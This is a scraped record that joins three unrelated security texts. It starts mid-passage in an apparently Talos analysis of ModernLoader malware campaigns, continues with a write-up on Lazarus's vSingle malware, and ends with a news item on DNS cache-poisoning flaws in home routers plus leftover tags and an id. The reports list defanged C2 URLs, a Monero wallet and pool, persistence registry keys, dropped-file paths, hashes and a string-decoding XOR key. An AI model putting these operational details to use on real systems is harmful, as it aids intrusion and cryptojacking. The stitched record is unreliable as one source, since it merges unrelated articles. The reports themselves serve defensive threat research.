script to download and launch socks.go module hxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go - a simple script to download and launch mine.go module Mine.go As opposed to the original and the RedLine loaders the Mine.go and Socks.go modules are not PowerShell scripts but Windows PE executables that are downloaded and launched by the previous commands downloaded from hxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go and hxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go respectively. The embedded modules in resources (encrypted) are: Sihost64 (watchdog): Ensures the miner is running, injected by runpe module loaded into conhost.exe. Injector (RunPE.Run): Injects PE files in a process name specified as an argument to the function. WR64.sys: Driver that may allow writing to kernel mode memory. mr: XMRig executable for Monero mining. th: ethminer. Decompiled miner code. The .NET miner loader is very similar to the code generated by the Silent cryptocurrency miner, as seen in the Nana.go OneDrive.exe miner. The major difference between the two is in the folders used to drop additional components and the mining pool site used for mining. Mine.go is using pool.supportxmr.com on TCP port 3333 for mining and the address is the same: 44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg. Mines.go The Mines.go module (21e72be7f818e2afd4d53ee8f16c7e4a4718a95dd75b90d83fa26181e426f578) is another miner, but this time, the actors chose to use the so-called ""Sapphire Multi-Coin"" miner that's advertised on various forums for sale since at least February 2022. The module is observed to be downloaded by a small gos.go script, which is download by one of the standalone downloaders (1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c). The miner module copies itself into %LOCALAPPDATA%\OneDrive\OneDrive.exe and creates a scheduled task to run the OneDrive.exe every minute. The miner creates the mutex 39cb3ed9d64849789471d05f94b7b62a that checks if the module is already running in memory. Sapphire miner advertisment. The miner is written in Golang and it is a wrapper around the XMRig miner. Based on the configuration, which can be downloaded from a remote server, the golang portion of the miner loads the XMRig miner, sets the registry key to ensure the miner is loaded and prepares the required parameters to choose which crypto currency will be mined based on the amount of RAM on the infected system. The miner loader will attempt to read the encrypted zip miner archive from the registry entry HKCU>\SOFTWARE\Wow64\<SHA256_encrypted> (96cd98d42b896f6c92fd97b435d727497102ca91ce6e95252251a28e0c3fb9f8) if it exists. If it does not, the Sapphire loader will attempt to download it from the URL predefined in its configuration. Based on the GPU type and the amount of RAM of the infected host, the Sapphire miner injected XMR using process-hollowing into the process space of a newly created svchost.exe process or a smartscreen.exe process. The miner executable is downloaded and decrypted before being injected into a process. The actual XMRig miner can be stored on the remote server, and in the case of the Mines.go module, the miner is downloaded from hxxp[://]31[.]41[.]244[.]231/0xMine/Temp[.]exe. The downloaded file is an AES-encrypted ZIP file that contains the XMRig miner and the WinRing0x64.sys helper driver. As above the XMRig is configured to use pool.supportxmr.com on TCP port 3333 with the same mining pool address. Socks.go The Socks.go module is an executable protected with Themida protector. The module contains a variant of the SystemBC back connect remote access Trojan with proxy functionality. The SystemBC connects to the same C2 IP address as the RedLine stealer module — 31[.]41[.]244[.]235 — but it uses TCP port 4440. SystemBC may allow the attacker to use the infected system as a proxy for their activities. Autorun The command to download and run the Autorun module by the ModernLoader bot is often observed together with the Meta module. The autorun downloads and runs the module autorunnn.exe, which sets a scheduled task to download and run the initial infection HTA application file hosted on the C2 server hxxp[://]31[.]41[.]244[.]231/0x?0=WindowsAnalyticsConfiguration. It also modifies a value in the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run so that the same mshta command is run when a user logs onto the system. Hello.go Hello.go module (3232126860f3729dda59f9db6476773997b4bcfb08e2e4b32b5214c30507d775), downloaded by at least one of the standalone downloaders (1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c), is a vs_community.exe UPX packed self-extracting 7-Zip dropper which drops and runs a number of other modules, most of them are focused on mining, and some on bypassing Windows defender. The module is similar to the nana.go payload, but contains more components. When the module is run, it drops the following files: %APPDATA%\nexts\killduplicate.cmd %APPDATA%\nexts\mine.exe - Silent Crypt miner %APPDATA%\nexts\output.exe %LOCALAPPDATA%\appdata.exe %APPDATA%\winserv\killduplicate.cmd %APPDATA%\winserv\appdata.exe %APPDATA%\winserv\updatershelper.exe %APPDATA%\install+\appdata.bat %APPDATA%\install+\killduplicate.cmd %APPDATA%\links\killduplicate.cmd %APPDATA%\links\mine.exe %APPDATA%\link\killduplicate.cmd %APPDATA%\link\mine.exe %APPDATA%\link\mines.exe %APPDATA%\onedrive\onedrive.exe %LOCALAPPDATA%\onedrive\onedrive.exe %APPDATA%\drives\off.bat %APPDATA%\drives\updatershelper.exe %APPDATA%\google\libs\wr64.sys The modules are focused on establishing an environment to mine crypto currency, with miners and auxiliary modules tasked with disabling Windows updates and Windows Defender. Ws.go Ws.go module (dd24e5596c318b30c05cffc7467f5649564ab93874c9201bf758a1a2ce05228c) is observed as downloaded and executed by one of the tasks launched by the C2 server to the ModernLoader. Ws.go contains the already described PowerShell three assembly module loader scheme which attempts to inject the module XBinder-Output.exe (40d68523748f6eaf765970a40458faccbe84ef5dff7acbdaf29ac5a69d7cae6f). XBinder-Output exe contains a VB script WindowsConfiguration.vbs (c103c7686739669f3cfc123de34bdadb803c4ec8727cf12cd7cdc56be4bf60e1) in its resource section. The resource is encrypted and when decrypted is saved on the disk as %LOCALAPPDATA%\OneDrive\WindowsConfiguration.vbs and started. The VB script is a wrapper for PowerShell code which attempts to download and run the initial ModernLoader loader module from hxxp[://]31[.]41[.]244[.]231/0x/Loader[.]go. Ws.go drops and runs code to execute the initial ModernLoader loader. XBinder-Output sets the registry value HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsConfiguration to point to the dropped WindowsConfiguration VB script so it is run every time the user logs onto the system. SmartScreen.ps Downloaded by 1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5 which first loads a small script from hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/APPDATA/go.oo eventually loads an instance of ModernLoader connecting to the same C2 IP URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php. Auto.oo Auto.oo is an auxiliary module also downloaded by 1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5, and it launches an instance of SharpHide (881235fca4aeeb88950b952c0d9ce1a7d9a4eb838ce7d79447a26d2f45b1eaa5) which creates a hidden registry entry to start a copy of the SmartScreen Module every time the user logs onto the system. XboxLive.ps Downloaded by 1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5, which first downloads and runs a small script from hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/Documents/go.oo and eventually loads an instance of the ModernLoader (09db213df3dbd950a8bc75246be72f5b572b00dbd3a5bba45c7074443d0928a7) into the process space of svchost.exe configured to connect to the same C2 URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php. Each campaign has its own unique version name although the functionality of the loader is the same. The first loader version is ""Live"" while SmartScreen.ps and XBoxLive.ps each have their own version name which can presumably be tracked in the C2 server panel by the operator. R0.go This module has been spotted in the dynamic analysis of the 7-Zip self-extracting dropper 4a6ef2379195140aa31d339329ca06bd28589fa13fd88cfcf9d76cb2d4ab99c1. The module is a three assembly PowerShell which loads an obfuscated injector for a variant of the DcRAT (2c631588c491aa32c20f6a99201ba82982a31b1c763054562d59cd1a5a1ea14b). The loader is first injected into the process space of RegSvcs.exe and then into the process space of a newly created svchost.exe process. The DcRAT client is configured to connect to the IP address 31.41.244.235, just as the other RATs in this campaign. The TCP port to use is 8848. At the time of analysis, the host was not accessible. Decrypted DcRAT configuration data. Additional payloads Discord Spreader While searching for other modules communicating with C2 servers we spotted a file 838170edffbca1cadef3b7039330376c1aad914883103834c25e9bb92d9bfad1, purporting to be a copy of the µTorrent Web BitTorrent client. Once executed the file drops another randomly named file, which is a downloader written in Visual Basic with the code similar to other Offer.exe downloaders. The downloader, 9b347b48026f205733abbc24c502dfff5428341e10c6944687cdbfe70770f5f3, executes the following PowerShell command to download and run code from 62[.]204[.]41[.]71. Discord Spreader module download. The interesting thing about the dropper is that it is based on the Project Discord Spreader, an open-source module available on GitHub. The utility is a Discord token stealer which may be used to spread the original file on Discord by sending messages to channels where the user of the stolen Discord tokens is active. The spreader can also include a user-mode rootkit r77 or additional payloads in the assembly ManifestResource stream. A builder is available to create new instances of the spreader and the sample used in this campaign was obfuscated with .NET obfuscators. The Discord Spreader builder. The author also left a message in the code to ""help"" anti-malware researchers when analyzing the sample. The message to analysts. Amazon offer added to archives This technique was observed on one of the infected systems in our telemetry. We observed the addition of a fake Amazon voucher named Amazon.com Gift Card 500 USD.gift.hta to archive files, such as RAR, 7-Zip and ZIP already present on the infected system. Each file's checksum is different, which indicates use of mild obfuscation to evade detection. We were unable to retrieve those HTA files from the infected systems but found a related file on VirusTotal, (5750d8d557fdcb6afb2d8cb52993fb07ac84a63aab0afc44efe30ffe08d48c2f), which contains code to communicate with 62[.]204[.]41[.]71 and whose filename is ""Amazon Gift Card 500 USD.gift.vbs."" The script first attempts to call PowerShell to download and run code from the URL hxxp://62[.]204[.]41[.]71/SPM/Spam.o' and then opens the browser to a link created by the URL shortening service hxxps://goo[.]su/DaqHw open a page that offers the user an alleged free Amazon gift card worth $500 USD. PHP scripts The actor seems to be interested in compromising vulnerable web applications and changing their configuration so that malicious PHP scripts serve malicious content to the users of the compromised application. One particular file, artadd.php (9704fa1a8242643f66572e7ee68e4e7d7bec9e7054319b8551fed4b3b0ccdd45) has been found in a few instances of compromised WordPress and CPanel applications. The file is obfuscated with a very simple obfuscation scheme and it eventually executes the code to download additional components futer.php (a249c275b0ad384ae1906d2ec169f77abce9d712ab8470eb5fe7040a71948026) and .htaccess (f013d15d2203ec6a90be789d4b58c99ca7e42d9beedb9c4c0b05f599e2eb0ea0) from 62[.]204[.]41[.]192. PHP script on compromised apps downloads additional components. The function of the .htaccess file is in this case to configure redirects to the futer.php if the browser accesses any files on the site with the extensions .zip, .exe or .rar. If the extension in the request matches the above, futer.php will execute code that retrieves a file from the actor's command and control (C2) server and serve that instead of the requested executable. PHP file attempts to replace a requested file with a malicious file from the C2 server. Summary This post represents the most notable portions of three campaigns we discovered in June. These campaigns portray an actor experimenting with different technology. The usage of ready-made tools shows that the actor understands the TTPs required for a successful malware campaign but their technical skills are not developed enough to fully develop their own tools. As a consequence of using off-the-shelf tools, the group improves its operational security and there are no obvious signs of who the actor behind the attacks is, except that they likely speak Russian. The most recent ModernLoader campaign modules. The actor is frequently using open-source components and code generators to achieve its goals. A number of remote access tools, stealers and cryptominers are used in the campaigns to eventually reap financial benefits for the actor. The actor has an interest in alternative distribution channels such as compromised web applications, archive infections and spreading by using Discord webhooks. Despite all the techniques and tactics used we estimate that the success of these campaigns is limited. Cisco Talos continues to monitor all available sources for signs of similar campaigns.

Several campaigns have been carried out against the U.S., Israel and other countries as part of offensive and massive attacks by the Lazarus group. Technical details A few weeks ago, the vSingle malware from the Lazarus arsenal was updated with many features, including a command and control (C&C) method based on GitHub pages. vSingle traditionally appears in the form of a PE file (.exe) that loads into the memory of a target DLL. vSingle is a multi-architecture malware, distributed both for Windows and Linux operating systems, as shown below. Figure 1: ELF VSingle (Linux) and VSingle Windows version Obfuscation routine This malware uses a simple XOR to obfuscate its strings with a fixed key. In Figure 2 below, we see the key “ o2pq0qy4ymcrbe4s ” is used to deobfuscate the malware string in runtime. Figure 2: String obfuscation of vSingle malware Some vSingle plain-text strings can be seen in the next table.

[+] Executable Download Result [+] Executable Download Parameter Error [+] Plugin Execute Result Malware commands VSingle is released by Lazarus APT with eight internal commands, namely: file upload communication interval execute shell commands download and execute the malware plugins update itself malware information transmission uninstall itself file download In addition, vSingle uses four types of plugins that can be downloaded into the target machines and executed, including: Windows executable (saved as a .tmp file) VBS file (saved as a .vbs file) BAT file (saved as .bat file); and Shellcode format VSingle GitHub C2 communication The latest release of this malware takes advantage of several GitHub repositories to perform its operation. Figure 3 below highlights the new feature published by JPCERT/CC analysis . Figure 3: High-level diagram of VSingle malware ( source ) The first packet sent to the C2 server has two PHP parameters, uid and upw . The first one contains a hash value of the target hostname, kernel release number, and IP address. The upw contains a Base64-encoded string of “ [IP address]|30.0|12b “ Figure 4: First communication of vSingle malware The data received from the C2 server, including the RC4 key, are stored in the /tmp directory ( /tmp/.sess_%08x ), as illustrated in Figure 3. The GitHub endpoints are generated dynamically during the malware execution. According to the JPCERT/CC analysis , the username and repository used by the malware are obtained from this list during the execution. ( source ) The values are then replaced in the following path: https://raw.githubusercontent.com/ %s/%s/ master/README.de Finally, inside the GitHub pages, other endpoints can be obtained during the malware execution, probably the final C2 where data is sent, and the commands received. Figure 5: vSingle — final C2 endpoint on GitHub repository Final thoughts Malware tactics, techniques and procedures are constantly changing. With this approach, Lazarus groups pretend to be away from the cybersecurity radar and extend their threats’ life-cycle. Because GitHub is a legitimate source, identifying this kind of traffic as suspicious can be challenging. Internet traffic should be limited to known sources if possible and monitored as well. Host-based security via EDR and AV systems should also be considered the key to identifying, blocking and tracking cyber threats early.

The German cross-institution research group comprising Philipp Jeitner, Haya Shulman, Lucas Teichmann and Michael Waidner found many routers vulnerable to “injections of fake [DNS] records via misinterpretation of special characters”, and “in 15 of the 36 routers the mechanisms that are meant to prevent [DNS] cache poisoning attacks can be circumvented.” DNS, the domain name service, is the lookup mechanism that tells a user’s computer Google can be found at the IPv6 address 2404:6800:4006:814::200e:. Routers implement DNS caching because in the pre-broadband era, responses to DNS queries might be slow; if the record isn’t held in the cache, the router forwards the DNS request upstream to their ISP. However, as the authors write in XDRI Attacks - and - How to Enhance Resilience of Residential Routers , errors in vendors’ DNS implementations are so common they should instead use standard DNS software such as BIND. Even better, don’t bother performing DNS functions in the users’ network: “Removing DNS improves the resilience of routers and client networks, without a significant loss of performance”, the study said. “In our internet-wide study with an advertisement network, we identified and analysed 976 residential routers … out of which more than 95 percent were found vulnerable. “Overall, vulnerable routers are prevalent and are distributed among 177 countries and 4830 networks”. The attacks the researchers used focused mainly on injecting special characters to poison the router’s DNS cache. AVM, DrayTek, Tenda, Edimax, Mercusys, STRONG, CenturyLink, Actiontec, Bintec and Huawei devices were found vulnerable. Corrected: the author misread a table in the paper, and in the original version of this story incorrectly identified products from Asus, D-Link , Linksys, Cisco, Telekom and Vodafone as vulnerable.","['dns', 'router', 'security', 'vulnerability']",bb138117-e4ae-5006-aedd-99d6ac96bb1d,"Router vendors, particularly in the home/SOHO market, are so bad at implementing DNS caching they should abandon that functionality, researchers warn. “In 15 of the 36 routers the mechanisms that are meant to prevent [DNS] cache poisoning attacks can be circumvented.” DNS, the domain name service, is the lookup mechanism that tells a user’s computer Google can be found at the IPv6 address 2404:6800:4006:814::200e:."
